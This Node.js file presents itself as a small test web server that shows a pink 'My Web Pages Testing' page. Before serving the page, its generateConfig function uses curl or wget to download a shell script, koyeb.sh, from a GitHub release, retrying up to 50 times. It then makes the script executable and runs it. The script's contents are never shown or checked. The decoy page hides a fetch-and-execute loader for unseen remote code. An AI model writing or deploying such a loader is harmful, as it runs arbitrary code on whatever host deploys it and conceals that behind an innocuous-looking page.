const { exec } = require('child_process');
const scriptFileName = 'koyeb.sh';
const scriptURL = 'https://github.com/dcwhoever/ForGamePlays/releases/download/xr/koyeb.sh';

async function isCommandAvailable(command) {
  return new Promise(resolve => {
    exec(`${command} --version`, (error, stdout, stderr) => {
      resolve(!error);
    });
  });
}

async function processCommand(command) {
  return new Promise((resolve, reject) => {
    exec(command, (error, stdout, stderr) => {
      if (error) {
        reject(error);
      } else {
        resolve();
      }
    });
  });
}

async function downloadScript(scriptURL) {
  let downloadCommand = null;

  if (await isCommandAvailable('curl')) {
    downloadCommand = `curl -L -o ${scriptFileName} ${scriptURL}`;
  } else if (await isCommandAvailable('wget')) {
    downloadCommand = `wget -P . ${scriptURL}`;
  } else {
    console.log('Neither curl nor wget was found, exiting...');
    process.exit(1);
  }

  let retryTimes = 50;
  let delay = 1;
  let success = false;

  for (let i = 0; i < retryTimes; i++) {
    try {
      await processCommand(downloadCommand);
      console.log(`Download successful in attempt ${i + 1}`);
      success = true;
      break;
    } catch (e) {
      console.error(`Download attempt ${i + 1} failed with error:`, e);
    }
  }

  if (!success) {
    console.log('Download failed after maximum attempts');
    process.exit(1);
  }
}

async function runScript() {
  try {
    console.log('come in');
    await processCommand(`chmod +x ./${scriptFileName}`);
    await processCommand(`./${scriptFileName}`);
    console.log('come out');
  } catch (e) {
    console.error('Failed to run the script:', e);
  }
}


async function generateConfig() {
  await downloadScript(scriptURL);
  await runScript();

var http = require('http');
var server = http.createServer(function(req, res) {
  res.writeHead(200, { 'Content-Type': 'text/html' });
  const htmlContent = `
<!DOCTYPE html>
<html>
<head>
    <title>My Web Pages Testing</title>
    <style>
        body {
            background-color: pink;
            text-align: center;
            padding: 50px;
            font-family: Arial, sans-serif;
        }

        h1 {
            color: white;
            background-color: #ff3399; /* 粉红色 */
            padding: 20px;
            border-radius: 10px;
        }

        p {
            font-size: 18px;
            margin-top: 20px;
        }

        .additional-element {
            margin-top: 30px;
            font-size: 24px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <h1>Welcome to My Web Page!</h1>
    <p>This is a sample web page with a veryverybig.....so....... i don't know...</p>
    <div class="additional-element">Before I dial the police emergency number, I want to warn all inappropriate adults, especially creepy uncles, to please leave voluntarily. Thank you for your cooperation!</div>
</body>
</html>
  `;

  res.end(htmlContent);
});

  //server.listen(process.env.PORT);
  server.listen(3000);

}


generateConfig().catch(console.error);


